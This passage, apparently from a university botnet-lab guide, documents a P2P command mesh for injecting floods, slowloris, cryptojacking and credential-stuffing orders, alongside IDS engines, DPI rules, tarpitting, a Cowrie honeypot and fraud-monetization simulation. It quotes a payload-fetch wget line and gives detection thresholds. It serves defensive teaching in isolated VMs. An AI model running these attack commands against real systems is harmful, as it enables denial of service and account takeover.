    --bootstrap 192.168.100.10:7400 \
    --inject '{"type":"syn_flood","target":"192.168.100.20","port":80,"duration":10}'

# Local 5-node demo with 40% resilience kill test (no SSH needed, runs on localhost)
./kademlia_p2p --demo

# Python alternative (same binary wire protocol, more verbose output):
python3 p2p_node.py --host 192.168.100.10 --port 7400
python3 p2p_node.py --demo
```

**All supported command types (injected as JSON via `--inject` or `store_value`):**

| `type` | C (`kademlia_p2p.c`) | Python (`p2p_node.py`) | Description |
|---|---|---|---|
| `syn_flood` | ✅ native | ✅ Scapy | Raw SYN flood |
| `udp_flood` | ✅ native | ✅ Scapy | Raw UDP flood |
| `slowloris` | ✅ native | ✅ inline | 150-socket HTTP exhaustion |
| `cryptojack` | ✅ native | ✅ inline | Duty-cycle CPU burn |
| `cred_stuffing` | ✅ via `system()` | ✅ via `requests` | Credential stuffing against `/login` |
| `stop_all` | ✅ | ✅ | Cancel all active attacks |
| `shutdown` | ✅ | ✅ | Gracefully exit the node process |
| `dga_search` | ✅ via `system()` | ✅ inline+fallback | DGA NXDOMAIN burst — IDS Engine 3 trigger |
| `update_secret` | ✅ `rotate_p2p_key()` | ✅ module-level `SHARED_SECRET` | Rotate the XOR mesh keystream; all nodes that receive it adopt the new key on the same poll cycle |
| `idle` | ✅ | ✅ | No-op |

> **`cred_stuffing` via P2P example:**
> ```bash
> ./kademlia_p2p --host 192.168.100.10 --port 7401 \
>     --bootstrap 192.168.100.10:7400 \
>     --inject '{"type":"cred_stuffing","target":"192.168.100.20","port":80,
>                "mode":"jitter","jitter":300,"duration":120}'
> ```
> Supported `mode` values: `"bot"` (rigid timing), `"jitter"` (randomized), `"distributed"` (multi-worker spoofed IPs).
> The C node spawns `cred_stuffing.py` via `system()`. The Python node uses an inline `requests` loop.

> **Key rotation via P2P inject:**
> ```bash
> # Rotate the XOR mesh key across all P2P nodes in one step:
> ./kademlia_p2p --host 192.168.100.10 --port 7401 \
>     --bootstrap 192.168.100.10:7400 \
>     --inject '{"type":"update_secret","secret":"NEW_KEY_2026_XYZ"}'
> # Equivalently with the Python node:
> python3 p2p_node.py --host 192.168.100.10 --port 7401 \
>     --bootstrap 192.168.100.10:7400 \
>     --inject '{"type":"update_secret","secret":"NEW_KEY_2026_XYZ"}'
> ```
> Nodes that receive this command call `rotate_p2p_key()` (C) or reassign `SHARED_SECRET`
> (Python), adopting the new XOR keystream for all subsequent wire messages. Combine with
> `POST /rotate_key` and `POST /push_key` for a simultaneous all-phase rotation (see the
> rotation sequence callout in Section 8.8).

**Wire message types (shared between C and Python):**

| Byte | Name | Description |
|---|---|---|
| `0x01` | PING | Liveness probe |
| `0x02` | PONG | PING response |
| `0x03` | FIND_NODE | Request k-closest contacts to a target ID |
| `0x04` | FOUND_NODES | Response with contact list |
| `0x05` | STORE | Store a key→value pair |
| `0x06` | FIND_VALUE | Request value for a key |
| `0x07` | FOUND_VALUE | Value response |
| `0x08` | STOP_ALL | Broadcast: halt all active attacks |
| `0x09` | SHUTDOWN | Broadcast: exit the node process |

All messages are XOR-encrypted with `SHA-256("AUA_P2P_MESH_KEY")` as keystream (the
initial value). After a successful `update_secret` command the keystream changes to
`SHA-256(new_secret)` on every node that processes it — nodes still using the old key
will fail to decrypt subsequent messages and drop out of the mesh.

---

## 9. Defensive Systems Reference

### 9.1 IDS (4 engines + host monitor)

```bash
# Victim VM: start IDS (run before any attack)
sudo python3 ids_detector.py

# If Python path issues:
sudo PYTHONPATH="/home/vboxuser/.local/lib/python3.12/site-packages" \
     python3 ids_detector.py
```

**Alert log file:** `ids_detector.py` writes every alert to `/tmp/ids.log` on the victim VM (in addition to stdout). This file is read by `collect_graph23_data.py --graph3` to count `CREDENTIAL STUFFING` detections when measuring TPR/FPR for Graph 3.

- When running via `run_full_lab.sh`, the orchestrator routes IDS stdout to `/dev/null` — `ids_detector.py` writes to `/tmp/ids.log` directly via its own file handler, so each alert is recorded exactly once. (An earlier design redirected stdout to the same path, writing every alert twice and doubling Graph 3 TPR counts.)
- When running **standalone** for Graph 3 data collection, the log file is created automatically at startup — no manual redirect needed.
- To suppress file logging entirely and use stdout only, set `IDS_LOG_FILE = None` at the top of `ids_detector.py`.
- To tail alerts live: `tail -f /tmp/ids.log`
- To count credential stuffing alerts fired so far: `grep -c "CREDENTIAL STUFFING" /tmp/ids.log`

> **Graph 3 detection proxy note:** `collect_graph23_data.py` does **not** rely solely on
> the IDS log for detection. Its primary proxy is `GET /tarpit/status` →
> `stats.total_flag_events` — a counter that increments the instant IDS Engine 2 calls
> `tarpit_state.flag()`, before the portal has served a single delayed response. This
> eliminates the race condition where a short bot run ends before the portal can increment
> `total_delayed`. The log file (`/tmp/ids.log`) is only used as a fallback when running
> directly on the victim VM.

**Engine 1 — Volumetric** (SYN/UDP flood detection):
- Alert triggers when SYN packets from one IP exceed **100/second** in a 1-second window
- UDP alert triggers at **200 packets/second**

**Engine 2 — Behavioral CV timing** (credential stuffing detection):
- Tracks timestamps of HTTP POST requests to `/login` per source IP
- Computes CV = σ/μ over a 20-request sliding window
- Alert triggers when `CV < 0.15` (bot-like rigid timing)
- Human users have CV typically > 0.5
- **Tarpit feedback:** on confirmed bot (CV < 0.15), the source IP is automatically flagged in `tarpit_state.json`; `fake_portal.py` then delays all responses to that IP by 8 ± 2 seconds; `tarpit_state.get_flag_count()` is incremented immediately
- **Auto-unblock:** if a flagged IP is silent for 120 seconds (bot finished or switched IP), the tarpit flag is automatically removed

**Engine 3 — DNS/DGA detection** (two independent alert triggers):
- **NXDOMAIN burst:** counts NXDOMAIN responses per source IP in a 30-second window; alert (HIGH) triggers at **≥10 NXDOMAINs in 30s**
- **High-entropy query burst:** scores domain name labels by Shannon entropy H(X) = −Σ P(xᵢ) log₂ P(xᵢ); alert (MED) triggers when one IP queries **≥5 high-entropy domains (H > 3.8) in 30s** — this path fires even before NXDOMAIN responses arrive (useful when DNS is slow or the DGA run is short)
- Both triggers include sample domains with entropy scores in the alert message
- Both write to `/tmp/ids.log` so both are counted by Graph 3 measurement

**Engine 4 — DPI/Covert channel** (repeated HTTPS polling):
- Tracks HTTPS SYN connections per (source IP, destination IP) pair in a 60-second window
- Alert (MED) triggers at **≥10 HTTPS connections to the same destination in 60s**

**Host-based engine** (cryptojacking + ghost process):
- Checks every 5 seconds for processes with `(deleted)` in `/proc/[pid]/exe` (memory-resident malware)
- Flags any non-system process sustaining **≥85% CPU** per core
- Detects process name spoofing: `/proc/pid/comm` ≠ exe basename

### 9.2 DPI Engine (Graph 1 data collection)

```bash
# C2 or victim VM — apply iptables egress rules:
sudo python3 firewall_dpi.py --setup

# Run DPI monitor (requires Scapy + root):
sudo python3 firewall_dpi.py --dpi --duration 120

# Measure TTD during live attack session (saves JSON for Graph 1):
sudo python3 firewall_dpi.py --measure --duration 120

# View current rules:
sudo python3 firewall_dpi.py --status

# Remove rules:
sudo python3 firewall_dpi.py --teardown
```

**What DPI detects:**

- **Covert polling (generic):** ≥ 10 HTTPS SYNs to the same destination IP in a 60-second window — flags any bot-like high-frequency polling pattern.
- **Covert polling (known hosts):** ≥ 20 TLS sessions to `github.com`, `raw.githubusercontent.com`, `reddit.com`, or `pastebin.com` in a 60-second window — catches dead-drop bots that deliberately target high-reputation domains. The higher threshold avoids false positives for developers who legitimately visit these sites several times per day.
- **Slowloris:** TCP connection to port 80 that stays open for > 30 seconds — the half-open header drip pattern.

The two-threshold design means the alert sensitivity depends on destination: aggressive against unknown IPs, tolerant of normal developer cadence to trusted domains.

| Detection rule | Threshold | Rationale |
|---|---|---|
| HTTPS SYNs → any unknown IP | ≥ 10 in 60 s | A bot polling its own dead-drop VM every 60 s hits this on the second poll cycle |
| TLS sessions → `github.com` / `raw.githubusercontent.com` / `reddit.com` / `pastebin.com` | ≥ 20 in 60 s | Legitimate developers visit these frequently; the higher bar prevents false positives during normal work |
| HTTP connection open duration (Slowloris) | > 30 s | Half-open header drip; any genuine HTTP request completes within a few seconds |

The thresholds are defined as class constants in `DPIEngine` and can be tuned without
restarting the engine by editing `firewall_dpi.py` and re-running `--dpi`.
### 9.X.1 fake_portal.py — new defenses
 
The following defenses are added on top of the existing tarpit integration.
All original endpoints (`/attempts`, `/tarpit/status`, `/tarpit/flag`,
`/tarpit/unflag`, `/attempts/reset`) are fully preserved with identical
response schemas.
 
| Defense | Mechanism | Article section |
|---|---|---|
| Per-username rate limiting | HTTP 429 after `USERNAME_RATE_MAX` (5) attempts per email per 60 s | "Adaptive rate limits — rate-limit by username, not just IP" |
| Progressive CAPTCHA | HTTP 403 + JSON math challenge after `CAPTCHA_FAIL_THRESHOLD` (3) consecutive failures from one IP | "Apply progressive friction — trigger CAPTCHA on suspicious behavior" |
| Hard block (429) | Explicit HTTP 429 after `N_BEFORE_BLOCK` (10) further failures post-tarpit | Escalation from silent tarpit to detected block |
| Unknown-account tracking | Per-IP count of attempts to non-existent emails, exposed in /stats/advanced | "Unusual volume of failed logins for non-existent accounts" |
| Breach credential detection | Flags passwords matching a 35-entry HIBP-style list | "Risk-based authentication" |
| IP reputation scoring | Composite 0–100 score via ip_reputation.py on every request | "Proxy and VPN usage detection" |
| /stats/advanced endpoint | All new signals for IDS Engine 5 | "Real-time visibility" |
 
#### Per-username rate limiting
 
```
Max USERNAME_RATE_MAX (5) attempts per email per USERNAME_RATE_WINDOW (60) s.
6th attempt for the same email → HTTP 429.
 
Teaching point: orthogonal to IP-based rate limiting.
A distributed attack from 100 different IPs still gets limited
per-username because credential stuffing loops over email:password
pairs — one attempt per account from many IPs still hits the same
email multiple times across workers.
```
 
#### Progressive CAPTCHA
 
```
After CAPTCHA_FAIL_THRESHOLD (3) consecutive failures from one IP:
  Portal returns HTTP 403 with JSON body:
  {
    "status": "captcha_required",
    "captcha_question": "What is 7 * 4?",
    "message": "Submit 'captcha_answer' with your next login request."
  }
 
Bot must:
  1. Parse the JSON response (not just check status code)
  2. Evaluate the arithmetic expression
  3. Re-submit: {"email":..., "password":..., "captcha_answer": 28}
 
A plain urllib/requests loop cannot do this without custom code.
Attacker cost increases: must extend the config to handle challenges.
Once solved, flag clears for that IP.  Wrong answer → stays blocked (403).
```
 
#### Hard block escalation path
 
```
IDS Engine 2 fires (CV < 0.15)
  → tarpit_state.flag(src_ip)
    → portal delays every response 8±2s (silent — bot unaware)
      → bot continues submitting (very slowly)
        → after N_BEFORE_BLOCK (10) post-tarpit failures:
          → HTTP 429 (explicit — attacker now knows they are detected)
 
Teaching point: shows the tradeoff between:
  - Silent tarpitting: maximum intelligence gathering, bot stays up
  - Hard block: maximum disruption, attacker knows and adapts
```
 
#### /stats/advanced endpoint
 
```bash
# Inspect all new signals in real time:
curl http://192.168.100.20/stats/advanced | python3 -m json.tool
```
 
Key fields consumed by IDS Engine 5:
 
| Field | Type | Meaning |
|---|---|---|
| `success_rate_pct` | float | % of logins that succeeded |
| `unknown_acct_pct` | float | % of attempts to non-existent emails |
| `off_hours_pct` | float | % outside 08:00-22:00 local time |
| `breached_cred_hits` | int | Attempts with HIBP-listed passwords |
| `per_ip_unknowns` | dict | Per-IP unknown-account counts |
| `reputation_scores` | dict | Latest IP reputation per source IP |
| `captcha_active` | dict | IPs in active CAPTCHA challenge state |
| `hard_blocked_ips` | dict | IPs that hit the post-tarpit 429 threshold |
| `hourly_distribution` | dict | Login counts by hour-of-day |
| `total_flag_events` | int | Cumulative tarpit flag counter (Graph 3) |
 
---
 
### 9.X.2 IDS Engines 5 and 6 (new)
 
#### Engine 5 — Login Analytics
 
Polls `GET /stats/advanced` every `ENGINE5_POLL_SEC` (30) seconds and fires
alerts for statistical anomalies in the login stream that are **invisible to
packet-level analysis**:
 
| Signal | Threshold | Severity | Article section |
|---|---|---|---|
| Success-rate drop | < 5% with ≥ 20 attempts | HIGH | "Drop in login success rate across high volume" |
| Off-hours surge | > 50% outside 08:00-22:00 | MED | "Login surges during off-hours" |
| Unknown-account spike | > 40% non-existent emails | HIGH | "Unusual volume of failed logins for non-existent accounts" |
| Breached-cred use | ≥ 5 HIBP-list hits | MED | (implied by article breach-dump sourcing section) |
 
**Why Engine 5 is necessary even with Engine 2:**
Engine 2 fires on low CV timing — but `distributed` mode spreads requests
across many IPs, each IP making only a few attempts.  No single IP fills
the CV window.  Engine 5 aggregates at the application layer and sees the
campaign regardless of IP count.
 
Each alert fires at most once per `_E5_ALERT_COOLDOWN` (120) seconds to
avoid alert floods during a sustained run.
 
**Dependency:** Engine 5 requires `fake_portal.py` running at
`PORTAL_HOST:PORTAL_PORT` (`192.168.100.20:80`).
 
#### Engine 6 — Cross-IP Fingerprint Correlation
 
Reads `ip_reputation.py`'s shared in-memory state to detect the same
browser fingerprint seen from multiple source IPs.
 
```
Fingerprint = SHA-256(User-Agent | Accept | Accept-Language | Accept-Encoding)[:12]
 
Alert fires when:
  same fingerprint seen from ≥ FP_MULTIIP_MIN (3) distinct IPs
  within FP_WINDOW (300) seconds
 
MITRE: T1090 (Proxy)
```
 
**Dependency:** Engine 6 requires `ip_reputation.py` importable in the
same directory.  Without it, Engine 6 prints a warning and does not start.
 
**Teaching experiment:**
 
```bash
# Attack 1 — no UA rotation: same fingerprint from 4 worker IPs
python3 cred_stuffing.py --mode distributed --workers 4
# → Engine 6 fires CrossIP/Fingerprint alert
 
# Attack 2 — with UA rotation: fingerprint varies per request
python3 cred_stuffing.py --mode distributed --workers 4 --ua-rotate
# → Engine 6 silent (no shared fingerprint to correlate)
# → Teaches: HTTP-header rotation evades Engine 6; TLS JA3 would not
```
 
---
 
### 9.X.3 IP Reputation Module
 
```bash
# Demo mode — scores a bot-like vs browser-like request:
python3 ip_reputation.py
```
 
Scoring bands: CLEAN (0–24) / SUSPECT (25–49) / LIKELY_BOT (50–74) / BOT (75–100).
 
The portal logs the band for every attempt via `/stats/advanced → reputation_scores`.
 
Score components:
 
| Component | Points | Detects |
|---|---|---|
| Datacenter/hosting subnet | +15 | VPS / cloud-hosted bot |
| Suspicious User-Agent | +20 | urllib, curl, requests, scrapy… |
| Missing Accept-Language | +15 | Scripts that omit browser headers |
| Chrome UA without Sec-Ch-Ua | +10 | Impersonating Chrome incompletely |
| Same fingerprint ≥3 IPs / 5 min | +25 | Proxy pool with shared config |
| X-Forwarded-For cycling ≥3 /24s | +20 | Header-based proxy rotation |
 
---
 
### 9.X.4 Monetization Simulator
 
```bash
# Run standalone with default hits:
python3 monetization_sim.py
 
# Specific credentials:
python3 monetization_sim.py --hits admin@example.com:securePass123!
 
# Disable specific phases:
python3 monetization_sim.py --no-pivot --no-resale
 
# Output files (add all to .gitignore):
#   /tmp/drain_log.json        gift-card/loyalty drain receipts
#   /tmp/resale_market.json    account resale listings
#   /tmp/pivot_log.json        password pivot results per service
#   /tmp/verified_hits.txt     verified combo list export
```
 
Monetization vectors and article mapping:
 
| Vector | Models | Article quote |
|---|---|---|
| Balance drain | Gift card + loyalty point theft | "drain stored value" |
| Fraudulent order | Purchase via saved card | "make fraudulent purchases" |
| Account resale | Telegram/dark-web listing $0.50–$15 | "sold or bundled into new combo lists" |
| Password pivot | 30% reuse rate, 6 other services | "pivot — reset passwords on other platforms" |
| Combo export | `/tmp/verified_hits.txt` | "marketed as verified hits" |
 
### 9.3 Tarpitting (Credential Stuffing Response)

Rather than blocking suspected credential-stuffing bots outright (which reveals detection and lets the attacker tune their jitter), a tarpit diverts them to a slow-response endpoint that artificially delays each reply by several seconds. The bot remains connected but productive throughput approaches zero, increasing the attacker's time-cost per tested credential by orders of magnitude without triggering an obvious block.

**How the loop works:**

```
IDS Engine 2 detects CV < 0.15
    → calls tarpit_state.flag(src_ip)
        → writes timestamp to /tmp/tarpit_state.json  (TTL = 300s)
        → increments tarpit_state.total_flag_events (persisted, survives TTL expiry)
            → fake_portal.py checks is_flagged(src_ip) on every /login request
                → flagged IPs receive time.sleep(8 ± 2s) before any response
                → legitimate IPs (high CV) see no delay
```

**Auto-unblock:** `ids_detector.py` monitors login-request timestamps per IP. If a flagged IP goes silent for 120 seconds (bot finished its run or switched IP), the flag is automatically removed. The `total_flag_events` counter is **not** decremented on unblock — it is a cumulative history of all detections this session, reset only by `clear_all()`.

**`tarpit_state.py` CLI:**

```bash
# List all currently flagged IPs (and cumulative event count)
python3 tarpit_state.py list

# Manually flag an IP (e.g. from a separate detection script)
python3 tarpit_state.py flag 192.168.100.11

# Remove a flag early (before TTL expiry)
python3 tarpit_state.py unflag 192.168.100.11

# Wipe all entries and reset cumulative counter (post-session cleanup)
python3 tarpit_state.py clear

# Show just the cumulative total_flag_events count
python3 tarpit_state.py count
```

**`fake_portal.py` REST endpoints** (admin/debug use):

```bash
# Flag an IP via HTTP (alternative to IDS file-based signalling)
# Also increments total_flag_events so Graph 3 measurement still works.
curl -X POST http://192.168.100.20/tarpit/flag \
     -H "Content-Type: application/json" \
     -d '{"ip":"192.168.100.11"}'

# Remove a flag via HTTP
curl -X POST http://192.168.100.20/tarpit/unflag \
     -H "Content-Type: application/json" \
     -d '{"ip":"192.168.100.11"}'

# Inspect tarpit state.
# stats.total_flag_events = race-free Graph 3 detection counter (use this for TPR)
# stats.total_delayed     = requests actually delayed (legacy, race-prone)
curl http://192.168.100.20/tarpit/status | python3 -m json.tool

# Reset the in-memory attempt log, tarpit stats, and total_flag_events
# between measurement windows. Also wipes /tmp/tarpit_state.json when
# clear_tarpit is true (required for accurate Graph 3 per-level measurement).
curl -X POST http://192.168.100.20/attempts/reset \
     -H "Content-Type: application/json" \
     -d '{"clear_tarpit":true}'
# Returns: {"status":"reset","cleared_tarpit":true}
```

> **Tarpit dependency for Graph 3:** `fake_portal.py` must be started from `~/lab/`
> where `tarpit_state.py` exists, so that `TARPIT_ENABLED = True` inside the portal.
> If it starts with `TARPIT_ENABLED = False`, Engine 2 cannot call `tarpit_state.flag()`
> and `total_flag_events` will always be 0 — all TPR readings will show 0% regardless
> of whether the IDS actually fired. Verify with:
> `curl http://192.168.100.20/tarpit/status | python3 -c "import sys,json; d=json.load(sys.stdin); print('Tarpit enabled:', d['enabled'])"`

**Configuration** (edit `tarpit_state.py` constants to tune):

| Constant | Default | Effect |
|---|---|---|
| `STATE_FILE` | `/tmp/tarpit_state.json` | Shared between IDS and portal |
| `TTL_SECONDS` | `300` | Per-IP flag expires after 5 minutes |
| `TARPIT_DELAY` | `8.0` | Seconds of sleep per flagged request |
| `TARPIT_JITTER` | `2.0` | ±jitter on delay to avoid timing fingerprint |

At the default 8s delay, a 1,000-credential attack that would complete in ~8 minutes (at 500ms intervals) now takes ~2.2 hours — without the attacker knowing they have been detected.

### 9.4 Cowrie Honeypot

```bash
# Victim VM: full setup (creates dirs, installs cowrie.cfg, iptables redirect,
# generates SSH host keys, writes userdb with wildcard credentials)
sudo python3 honeypot_setup.py --setup

# Or start Cowrie manually after setup:
cowrie start

# Monitor live:
tail -f ~/.cowrie/var/log/cowrie/cowrie.json | python3 -m json.tool

# Analyze logs after attack:
python3 honeypot_setup.py --analyze

# Generate NIST IR report:
python3 honeypot_setup.py --report --out incident_report.md

# Remove iptables rules when done:
sudo python3 honeypot_setup.py --teardown
```

**SSH host key generation:** `--setup` automatically generates `etc/ssh_host_rsa_key` and `etc/ssh_host_dsa_key` (required by `cowrie.cfg`). It tries `ssh-keygen` first, then falls back to the `cryptography` library, then `paramiko`. If all three fail it prints the exact manual commands to run. Keys are skipped if they already exist, so `--setup` is safe to re-run.

**Cowrie working-directory requirement:** All paths in `cowrie.cfg` are relative to Cowrie's root directory. Always start Cowrie with `cd ~/cowrie && bin/cowrie start` — launching it from any other directory causes "No such file" errors for the key files (`etc/ssh_host_rsa_key`) and honeyfs entries at startup. `honeypot_setup.py --setup` prints the correct start command for reference after completing setup.

Cowrie accepts **all credentials** (configured in `userdb.txt` with `*` wildcard) so every brute-force attempt logs in successfully and the scanner's post-login commands are captured.

---

## 10. Understanding the Math

### Kademlia XOR Distance

Each node has a 160-bit ID. The distance between two nodes x and y is `d(x,y) = x XOR y`. The key property: XOR is symmetric (`d(x,y) = d(y,x)`) and satisfies the triangle inequality, so the routing table partitions the ID space into 160 buckets where bucket i holds contacts whose XOR distance has its highest bit at position i. This means nodes naturally keep detailed routing information about nearby nodes and sparser information about distant ones.

**Why it beats centralized C2:** With k=8 per bucket and 160 buckets, each node maintains at most 1,280 peer entries. A lookup for any key takes at most O(log n) hops. Killing 30% of nodes simply shifts routing — the DHT heals itself because every bucket has k redundant entries.

### Shannon Entropy (DGA Detection)

For a domain name with character distribution P(xᵢ):

```
H(X) = −Σ P(xᵢ) log₂ P(xᵢ)
```

Natural English domain names have low entropy (e.g., `google.com` label = 0 repetition of a few chars ≈ 3.0 bits/char). DGA-generated names from SHA-256 hash chaining approach maximum entropy for their alphabet ≈ 3.8–4.2 bits/char. The IDS threshold of 3.8 bits/char catches the high-entropy tail while avoiding false positives on normal domains.

### CV-Based Bot Detection (Credential Stuffing)

Inter-arrival times for a bot with programmed interval T follow a near-zero-variance distribution (CV ≈ 0.01). Even with jitter, bots rarely exceed CV = 0.3. Human typing has CV > 0.5 due to natural reading/thinking pauses. Threshold of 0.15 provides a clean separation in practice.

The **Graph 3 research finding:** as jitter ±range increases from 0 ms to 1000 ms (uniform distribution; effective std dev = range / √3 ≈ 0.577 × range), the bot's CV climbs from ~0.01 toward human-like values, and the TPR drops from ~98% to ~44%. The evasion threshold is around 500 ms ±range (≈ 289 ms effective std dev) — the exact jitter level at which the cost of running the attack (slow credential testing) starts to outweigh the detection risk.

### Graph 1 Detection-Rate Formula

`generate_graphs.py` converts raw Time-to-Detect (TTD) values from `firewall_dpi.py --measure`
into the percentage bars shown in Graph 1 using `ttd_to_rate(ttd)`:

```
TTD = 0         →  100 %   (blocked instantly — port-blocking result for SYN/UDP flood)
TTD = ∞ / "inf" →    0 %   (never detected  — port-blocking result for GitHub polling)
TTD = N seconds →  max(0, (1 − N / 120) × 100) %
```

The 120 s denominator is the `--duration` window used during live measurement. A DPI engine
that fires at t = 60 s therefore scores 50 %. This normalisation means Graph 1 bars are
sensitive to the measurement window length — if you re-run `--measure --duration 60` the
DPI detection rates will appear higher because the same absolute TTD is a larger fraction
of the shorter window. Keep the window at 120 s for comparability with the simulated
reference data.
### IP Reputation Scoring
 
The cumulative score is additive across all dimensions observed for
a source IP.  A request with `python-requests` + no Accept-Language
already scores 35 (SUSPECT).  A distributed attack where the same
fingerprint appears from 3 IPs adds +25 (≥50, LIKELY_BOT).
 
No single indicator is conclusive — this is intentional.  A legitimate
developer might curl a login form.  Stacking multiple weak signals into
a composite score is the pattern used by commercial bot-management
platforms (Castle, Cloudflare, Akamai Bot Manager).
 
### Off-Hours Detection
 
`off_hours_pct = attempts_outside_08:00-22:00 / total_attempts × 100`
 
A threshold of 50% means the majority of traffic must be nocturnal before
an alert fires — avoiding false positives from evening users while still
catching campaigns launched from distant time zones.
 
### Unknown-Account Spike
 
A service with 3 known users (alice, bob, admin) receiving 100 login
attempts, of which 70 target unknown emails:
 
`unknown_acct_pct = 70/100 × 100 = 70%`  (threshold 40%)
 
This indicates the attacker used a bulk breach dump not filtered for this
service's user base — exactly as described in the article.
 
The per-IP breakdown in `/stats/advanced → per_ip_unknowns` reveals which
source IP drives the spray, enabling targeted tarpit escalation even when
the timing CV is too high for Engine 2 to trigger alone.

---

## 11. Research Graphs (Week 7 Data Collection)

All three graphs auto-detect real measurement files next to `generate_graphs.py` and fall back to plausible simulated data when they are absent. Graph titles are annotated **[REAL DATA]** or **[SIMULATED DATA]** so you can see at a glance what's been collected.

**Check what data you still need:**

```bash
python3 generate_graphs.py --status
```

Output example:
```
  ✅  Graph 1: REAL DATA  (graph1_measured_data.json, 2026-04-07 14:22)
  ❌  Graph 2: MISSING — collect with:
       python3 collect_graph23_data.py --graph2  (victim VM, after Mirai runs)
  ❌  Graph 3: MISSING — collect with:
       python3 collect_graph23_data.py --graph3  (bot VM)
```

### Graph 1: Port Blocking vs. DPI (TTD by attack vector)

**How to collect real data** (run during a live attack session):

```bash
# C2 or victim VM — while attacks are running:
sudo python3 firewall_dpi.py --measure --duration 120
# Outputs: graph1_measured_data.json  (generate_graphs.py reads this automatically)
```

**Expected finding:** port blocking detects SYN/UDP floods instantly (TTD ≈ 0s for blocked ports) but never detects GitHub-style polling (port 443 — TTD = ∞). DPI detects the covert channel after 20–60 seconds of session-level behavioral analysis.

### Graph 2: Persistence Paradox (MTBI vs. credential hardening)

**How to collect real data** (run on the victim VM, interactive):

```bash
# On victim VM after each Mirai scanner run from bot VM:
python3 collect_graph23_data.py --graph2 --wipes 8 --bot-ip 192.168.100.11
# Outputs: graph2_measured_data.json
```

The script watches the Cowrie log for `session.connect` events from the bot IP and records the elapsed time since the last wipe (Mean Time Between Infections). You run it interactively: wipe the victim VM → type ENTER when it reboots → wait → the script auto-detects re-infection from the Cowrie log and records the MTBI. After 8 cycles it asks whether a hardened-credential device was re-infected.

If Cowrie is not running, the script falls back to manual entry: it prompts you for each MTBI value after each wipe.

**Expected finding:** default-credential devices have MTBI of 2–4 minutes regardless of wipe frequency. Hardened devices are never re-infected. This is the "Persistence Paradox" — the root cause (default credentials) cannot be fixed by ephemerality alone.

### Graph 3: IDS Accuracy vs. Bot Jitter (TPR/FPR curve)

**How to collect real data** (run on the bot VM while portal + IDS are running on victim VM):

```bash
# Victim VM — start these first:
sudo python3 ids_detector.py   # Engine 2 triggers tarpit_state.flag() on detection
sudo python3 fake_portal.py    # exposes /tarpit/status used for alert counting

# Bot VM — automated 8-level jitter sweep:
python3 collect_graph23_data.py --graph3 --host 192.168.100.20
# Outputs: graph3_measured_data.json
```

**How alert detection works across VMs:**
`ids_detector.py` runs on the victim VM. When Engine 2 fires, it calls `tarpit_state.flag(src_ip)`, which immediately increments the persistent `total_flag_events` counter in `/tmp/tarpit_state.json`. The portal exposes this counter via `GET /tarpit/status → stats.total_flag_events`. `collect_graph23_data.py` reads this counter as its **primary detection proxy** — it increments the instant the IDS flags the IP, not only when the portal serves a delayed response, eliminating the race condition where a short bot run ends before any delayed response is processed.

If you run `collect_graph23_data.py` directly on the victim VM (or have the log bind-mounted), the local IDS log file is used as a fallback:

```bash
# Running on the victim VM itself — file is local, use it directly:
python3 collect_graph23_data.py --graph3 --host 192.168.100.20 \
    --ids-log /tmp/ids.log
```

> **Prerequisite check:** before starting the sweep, verify the portal has tarpit enabled:
> ```bash
> curl -s http://192.168.100.20/tarpit/status | python3 -c \
>   "import sys,json; d=json.load(sys.stdin); print('Tarpit enabled:', d['enabled'])"
> # Must print: Tarpit enabled: True
> ```
> If it prints `False`, tarpit_state.py is not importable by the portal. Start
> `fake_portal.py` from `~/lab/` where `tarpit_state.py` exists, then retry.

> **Note:** single-run binary results are noisy at intermediate jitter levels. Run the sweep multiple times and average for smoother curves — the script prints a reminder at the end.

> **Accuracy tip:** start `ids_detector.py` directly in a terminal on the victim VM (not via `run_full_lab.sh`) when collecting Graph 3 data. This gives live alert output in the terminal alongside the log file and avoids any dependency on the orchestrator's process management.

> **Human baseline duration:** The automated sweep runs the human baseline for **60 seconds** (not 30). Human mode uses Gaussian delays around 3 seconds, so only ~10 requests complete in 30s — not enough for Engine 2 to evaluate CV. 60 seconds yields ~20 requests, sufficient for a reliable FPR reading.

Manual sweep (if you prefer to control each level):

```bash
# On victim VM — start IDS and portal first (from ~/lab/):
sudo python3 ids_detector.py &
sudo python3 fake_portal.py &

for JITTER in 0 50 100 200 350 500 750 1000; do
    # Reset portal baseline before each run (wipes flag counter too)
    curl -s -X POST http://192.168.100.20/attempts/reset \
         -H "Content-Type: application/json" -d '{"clear_tarpit":true}'
    # Snapshot race-free flag counter before run
    BEFORE=$(curl -s http://192.168.100.20/tarpit/status | python3 -c \
             "import sys,json; d=json.load(sys.stdin); print(d['stats'].get('total_flag_events', d['stats']['total_delayed']))")
    # Run bot traffic from bot VM for 30s
    python3 cred_stuffing.py --mode jitter --interval 500 --jitter $JITTER &
    sleep 30; kill %1; sleep 5
    # Snapshot counter after run
    AFTER=$(curl -s http://192.168.100.20/tarpit/status | python3 -c \
            "import sys,json; d=json.load(sys.stdin); print(d['stats'].get('total_flag_events', d['stats']['total_delayed']))")
    echo "Jitter ±${JITTER}ms range (~$((JITTER * 577 / 1000))ms eff-stddev) — IDS fired: $([[ $AFTER -gt $BEFORE ]] && echo YES || echo NO)"
done
```

**Expected finding:** TPR ≈ 98% at jitter = 0 ms, drops to ~44% at jitter = 1000 ms. FPR stays below 12% across all jitter levels (human traffic consistently has high CV).

### Generate all graphs:

```bash
pip3 install matplotlib
python3 generate_graphs.py                        # saves to ./graphs/ by default
python3 generate_graphs.py --out /tmp/my_graphs/  # custom output directory
```

---

## 12. Incident Response Report

The IR report is generated automatically from real Cowrie log data:

```bash
# Victim VM: after running mirai_scanner from bot VM
python3 honeypot_setup.py --analyze
python3 honeypot_setup.py --report --out incident_report.md
cat incident_report.md
```

The report follows **NIST SP 800-61r3** structure: Detection → Containment → Eradication → Recovery → MITRE ATT&CK table → Statistics → Lessons Learned.

**MITRE ATT&CK techniques you should observe:**

| ID | Technique | Trigger |
|----|---|---|
| T1082 | System Information Discovery | `uname -a`, `cat /proc/cpuinfo` |
| T1059.004 | Unix Shell | `/bin/busybox MIRAI` |
| T1105 | Ingress Tool Transfer | `wget http://C2/payload.*` |
| T1222 | File Permissions Modification | `chmod +x /tmp/.x` |
| T1070.004 | Indicator Removal — File Deletion | `rm -f /tmp/.x` |

---

## 13. Video Presentation Guide

Target: 20 minutes. Structure mapped to grading rubric.

| Timestamp | Section | What to show |
|---|---|---|
| 0:00–3:00 | Ethics + Architecture | VM isolation proof (`ping 8.8.8.8` fails), animated lifecycle diagram |
